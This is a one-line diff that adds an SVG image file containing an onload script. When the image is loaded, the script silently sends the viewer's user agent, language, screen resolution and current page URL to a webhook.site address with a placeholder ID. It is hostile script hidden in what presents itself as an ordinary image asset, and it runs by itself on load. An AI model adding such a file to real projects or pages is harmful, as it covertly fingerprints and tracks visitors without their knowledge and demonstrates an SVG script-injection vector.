@@ -1,0 +1,1 @@
+<svg xmlns="http://www.w3.org/2000/svg" onload="new Image().src='https://webhook.site/YOUR-ID?ua=' + navigator.userAgent + '&lang=' + navigator.language + '&res=' + screen.width + 'x' + screen.height + '&url=' + location.href;"> </svg>
